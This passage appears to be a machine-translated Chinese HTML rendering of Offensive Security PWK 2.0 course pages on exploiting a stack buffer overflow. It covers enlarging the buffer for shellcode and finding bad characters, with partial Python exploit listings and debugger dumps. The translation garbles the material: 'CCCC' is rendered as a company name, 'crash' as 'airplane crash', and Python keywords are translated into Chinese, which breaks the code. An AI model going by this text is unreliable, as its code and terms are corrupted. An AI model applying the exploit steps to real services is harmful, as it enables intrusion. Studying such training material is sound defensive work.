<div style="position:absolute;top:72845;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01307444 41414141 AAAA</font></font></nobr></div>
<div style="position:absolute;top:72862;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01307448 41414141 AAAA</font></font></nobr></div>
<div style="position:absolute;top:72879;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0130744C 41414141 AAAA</font></font></nobr></div>
<div style="position:absolute;top:72896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01307450 41414141 AAAA</font></font></nobr></div>
<div style="position:absolute;top:72913;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01307454 41414141 AAAA</font></font></nobr></div>
<div style="position:absolute;top:72930;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01307458 41414141 AAAA</font></font></nobr></div>
<div style="position:absolute;top:72947;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0130745C 42424242 BBBB</font></font></nobr></div>
<div style="position:absolute;top:72964;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01307460 43434343 中国交建</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:72981;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01307464 43434343 中国交建</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:72998;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01307468 43434343 中国交建</font></font></nobr></div>
<div style="position:absolute;top:73015;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0130746C 43434343 中国交建</font></font></nobr></div>
<div style="position:absolute;top:73032;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01307470 00000000  </font></font></nobr></div>
<div style="position:absolute;top:73049;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01307474 00000000  </font></font></nobr></div>
<div style="position:absolute;top:73068;left:368"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 351 - ESP 指向 C</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73098;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据经验，我们知道一个标准的反向 shell payload 需要大约 350-400</font></font></nobr></div>
<div style="position:absolute;top:73117;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字节的空间。</font><font style="vertical-align: inherit;">但是，上面的清单清楚地表明缓冲区中只有 16 个 C，</font></font></nobr></div>
<div style="position:absolute;top:73136;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这对于我们的 shellcode 来说几乎没有足够的空间。</font><font style="vertical-align: inherit;">解决此问题的最简单方法是尝试</font></font></nobr></div>
<div style="position:absolute;top:73156;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">将我们的漏洞利用中的缓冲区长度从 800 字节增加到 1500 字节，看看这是否允许</font></font></nobr></div>
<div style="position:absolute;top:73175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为我们的 shellcode 提供足够的空间，而不会破坏缓冲区溢出条件或更改</font></font></nobr></div>
<div style="position:absolute;top:73194;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">坠机的性质。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:73256;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据应用程序和漏洞类型，可能存在</font></font></i></nobr></div>
<div style="position:absolute;top:73276;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对输入长度的限制。</font><font style="vertical-align: inherit;">在某些情况下，增加 a 的长度</font></font></i></nobr></div>
<div style="position:absolute;top:73295;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区可能会导致完全不同的崩溃，因为较大的缓冲区</font></font></i></nobr></div>
<div style="position:absolute;top:73315;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">覆盖目标应用程序使用的堆栈上的其他数据。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73377;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对于此更新，我们将添加“D”字符作为我们的 shellcode 的占位符：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73411;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:73429;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">填充物 = "A" * 780</font></font></nobr></div>
<div style="position:absolute;top:73445;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eip = "B" * 4</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:73462;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">偏移=“C”* 4</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:73479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区 = </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"D" * (1500 - len(filler) - len(eip) - len(offset))</font></font></font></b></nobr></div>
<div style="position:absolute;top:73513;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inputBuffer = 填充符 + eip +</font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">偏移量</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">+ 缓冲区</font></font></nobr></div>
<div style="position:absolute;top:73530;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:73550;left:350"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 352 - 更新的用户名字符串</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:73579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">一旦发送了新的更长的缓冲区，就可以在调试器中观察到类似的崩溃。</font><font style="vertical-align: inherit;">这次，</font></font></nobr></div>
<div style="position:absolute;top:73598;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">然而，我们发现 ESP 指向不同的地址值，0x030E745C，如图 216 所示： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:73831;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="63"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 63 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:73864;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:74941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:74941;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:74941;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">383</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:74120;left:361"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">图 216：堆栈空间增加</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74151;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">因此，ESP 指向</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">D</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符（十六进制为 0x44）作为我们的占位符</font></font></nobr></div>
<div style="position:absolute;top:74170;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳代码：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:74205;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">030E7448 41414141 AAAA</font></font></nobr></div>
<div style="position:absolute;top:74222;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">030E744C 41414141 AAAA</font></font></nobr></div>
<div style="position:absolute;top:74239;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">030E7450 41414141 AAAA</font></font></nobr></div>
<div style="position:absolute;top:74256;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">030E7454 42424242 BBBB</font></font></nobr></div>
<div style="position:absolute;top:74273;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">030E7458 43434343 中国交建</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:74290;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">030E745C 44444444 DDDD</font></font></b></nobr></div>
<div style="position:absolute;top:74307;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">030E7460 44444444 DDDD</font></font></b></nobr></div>
<div style="position:absolute;top:74324;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">030E7464 44444444 DDDD</font></font></b></nobr></div>
<div style="position:absolute;top:74341;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">030E7468 44444444 DDDD </font></font></b></nobr></div>
<div style="position:absolute;top:74358;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">030E746C 44444444 DDDD</font></font></b></nobr></div>
<div style="position:absolute;top:74375;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></b></nobr></div>
<div style="position:absolute;top:74392;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">030E745C 44444444 DDDD</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:74411;left:319"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 353 - 增加了 shellcode 的堆栈空间</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这个小技巧为我们提供了更多的工作空间。</font><font style="vertical-align: inherit;">在进一步</font></font></nobr></div>
<div style="position:absolute;top:74460;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查，我们注意到我们现在总共有 704 个字节（0x030E771C - 0x030E745C = 704）</font></font></nobr></div>
<div style="position:absolute;top:74479;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们的shellcode的可用空间。</font></font></nobr></div>
<div style="position:absolute;top:74512;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">另外，请注意，每次我们运行漏洞利用时，ESP 的地址都会发生变化，但仍然指向我们的</font></font></nobr></div>
<div style="position:absolute;top:74531;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲。</font><font style="vertical-align: inherit;">我们将在下一节中解决这个问题，但首先我们要克服另一个障碍。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:74566;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.5</font></font></i></nobr></div>
<div style="position:absolute;top:74566;left:217"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">检查坏字符</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:74604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">根据应用程序、漏洞类型和使用的协议，可能存在某些</font></font></nobr></div>
<div style="position:absolute;top:74623;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">被认为是“坏”的字符，不应在我们的缓冲区、返回地址或</font></font></nobr></div>
<div style="position:absolute;top:74643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">外壳代码。</font><font style="vertical-align: inherit;">常见坏字符的一个示例，尤其是在由以下原因引起的缓冲区溢出中</font></font></nobr></div>
<div style="position:absolute;top:74662;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未经检查的字符串复制操作，是空字节，0x00。</font><font style="vertical-align: inherit;">这个角色被认为是坏的，因为</font></font></nobr></div>
<div style="position:absolute;top:74681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 C/C++ 等低级语言中，空字节也用于终止字符串。</font><font style="vertical-align: inherit;">这会导致</font></font></nobr></div>
<div style="position:absolute;top:74701;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符串复制操作结束，有效地在空字节的第一个实例处截断我们的缓冲区。</font></font></nobr></div>
<div style="position:absolute;top:74733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此外，由于我们将漏洞利用作为 HTTP POST 请求的一部分发送，因此我们应该避免</font></font></nobr></div>
<div style="position:absolute;top:74753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0x0D，返回字符，表示 HTTP 字段的结束（在本例中为用户名）。</font></font></nobr></div>
<div style="position:absolute;top:74786;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">经验丰富的漏洞利用开发人员将始终检查坏字符。</font><font style="vertical-align: inherit;">确定哪个的一种方法</font></font></nobr></div>
<div style="position:absolute;top:74805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符对于特定漏洞利用不好是发送所有可能的字符，从 0x00 到 0xFF，如</font></font></nobr></div>
<div style="position:absolute;top:74825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们缓冲区的一部分，看看应用程序如何在崩溃后处理这些字符。</font></font></nobr></div>
<div style="position:absolute;top:74857;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为此，我们将重新利用概念验证脚本并用所有可能的十六进制替换我们的 D</font></font></nobr></div>
<div style="position:absolute;top:74877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">字符，0x00 除外。</font><font style="vertical-align: inherit;">（清单 354）：</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:75019;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="64"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 64 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:75052;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:76129;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:76129;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:76129;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">384</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:75150;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">#!/usr/bin/python</font></font></nobr></div>
<div style="position:absolute;top:75167;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">进口插座</font></font></nobr></div>
</span></font>
<font size="3" color="#c00000" face="Times"><span style="font-size:11px;font-family:Times;color:#c00000">
<div style="position:absolute;top:75201;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">坏字符 = (</font></font></b></nobr></div>
<div style="position:absolute;top:75218;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"</font></font></b></nobr></div>
<div style="position:absolute;top:75235;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"</font></font></b></nobr></div>
<div style="position:absolute;top:75252;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"</font></font></b></nobr></div>
<div style="position:absolute;top:75268;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"</font></font></b></nobr></div>
<div style="position:absolute;top:75285;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50"</font></font></b></nobr></div>
<div style="position:absolute;top:75303;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60"</font></font></b></nobr></div>
<div style="position:absolute;top:75320;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70"</font></font></b></nobr></div>
<div style="position:absolute;top:75337;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80"</font></font></b></nobr></div>
<div style="position:absolute;top:75353;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90"</font></font></b></nobr></div>
<div style="position:absolute;top:75370;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0"</font></font></b></nobr></div>
<div style="position:absolute;top:75387;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0"</font></font></b></nobr></div>
<div style="position:absolute;top:75404;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0"</font></font></b></nobr></div>
<div style="position:absolute;top:75421;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0"</font></font></b></nobr></div>
<div style="position:absolute;top:75438;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0"</font></font></b></nobr></div>
<div style="position:absolute;top:75455;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"</font></font></b></nobr></div>
<div style="position:absolute;top:75472;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff" )</font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:75506;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">尝试：</font></font></nobr></div>
<div style="position:absolute;top:75523;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">打印 "\n发送邪恶的缓冲区..."</font></font></nobr></div>
<div style="position:absolute;top:75557;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">填充物 = "A" * 780</font></font></nobr></div>
<div style="position:absolute;top:75574;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">eip = "B" * 4</font></font></nobr></div>
<div style="position:absolute;top:75591;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">偏移=“C”* 4</font></font></nobr></div>
<div style="position:absolute;top:75625;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">inputBuffer = 填充</font><b><font color="#c00000"><font style="vertical-align: inherit;">符</font></font></b><font style="vertical-align: inherit;">+ eip + 偏移量 + </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">badchars</font></font></font></b></nobr></div>
<div style="position:absolute;top:75659;left:125"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">content = "username=" + inputBuffer + "&amp;password=A"</font></font></nobr></div>
<div style="position:absolute;top:75676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:75695;left:321"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 354 - 包含所有十六进制字符的脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:75725;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行我们的概念验证后，我们可以右键单击 ESP 并选择</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Follow in Dump</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以显示</font></font></nobr></div>
<div style="position:absolute;top:75744;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">内存中的输入缓冲区十六进制字符（清单 355）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:75779;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0326744C 41 41 41 41 41 41 41 41 AAAAAAAAA</font></font></nobr></div>
<div style="position:absolute;top:75796;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">03267454 42 42 42 42 43 43 43 43 BBBBCCCC</font></font></nobr></div>
<div style="position:absolute;top:75813;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0326745C   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01 02 03 04 05 06 07 08</font></font></font></b></nobr></div>
<div style="position:absolute;top:75830;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">03267464   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">09 00</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> C3 00 90 BC C3 00 ...Ã¼Ã。</font></font></nobr></div>
<div style="position:absolute;top:75847;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">0326746C 10 6C C4 00 06 00 00 00 lÄ....</font></font></nobr></div>
<div style="position:absolute;top:75864;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">03267474 18 AB 26 03 00 00 00 00 «&amp;....</font></font></nobr></div>
<div style="position:absolute;top:75883;left:337"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 355 - 堆栈上的截断缓冲区</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:75912;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">上面的输出显示只有 0x01 到 0x09 的十六进制值进入了堆栈内存</font></font></nobr></div>
<div style="position:absolute;top:75932;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲。</font><font style="vertical-align: inherit;">没有下一个字符 0x0A 的符号，它应该在地址 0x03267465 处。</font></font></nobr></div>
<div style="position:absolute;top:75965;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们考虑到 0x0A 字符代表换行时，这并不奇怪，它</font></font></nobr></div>
<div style="position:absolute;top:75984;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以与回车相同的方式终止 HTTP 字段。</font></font></nobr></div>
<div style="position:absolute;top:76017;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当我们从测试脚本中删除 0x0A 字符并重新发送有效负载时，结果</font></font></nobr></div>
<div style="position:absolute;top:76036;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">缓冲区在十六进制值 0x0C 之后终止（清单 356），表示返回字符 0x0D，</font></font></nobr></div>
<div style="position:absolute;top:76055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">正如我们已经讨论过的，也是一个坏角色： </font></font></nobr></div>
</span></font>

<div style="position:absolute;top:76207;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="65"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 65 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:76240;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:77317;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:77317;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:77317;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">385</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:76338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01B1744C 41 41 41 41 41 41 41 41 AAAAAAAA</font></font></nobr></div>
<div style="position:absolute;top:76355;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01B17454 42 42 42 42 43 43 43 43 BBBBCCCC</font></font></nobr></div>
<div style="position:absolute;top:76372;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01B1745C   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01 02 03 04 05 06 07 08</font></font></font></b></nobr></div>
<div style="position:absolute;top:76389;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01B17464   </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">09 0B 0C 00</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> 38 BD CE 00 ...8½Ω</font></font></nobr></div>
<div style="position:absolute;top:76406;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01B1746C 10 6C CF 00 06 00 00 00 lÏ....</font></font></nobr></div>
<div style="position:absolute;top:76423;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">01B17474 18 AB B1 01 00 00 00 00 «±....</font></font></nobr></div>
<div style="position:absolute;top:76442;left:307"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 356 - 按返回字符截断的缓冲区</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:76471;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以这种方式继续，我们发现 0x00、0x0A、0x0D、0x25、0x26、0x2B 和 0x3D 将</font></font></nobr></div>
<div style="position:absolute;top:76491;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在尝试溢出目标缓冲区时破坏我们的输入缓冲区。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:76525;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">11.2.5.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
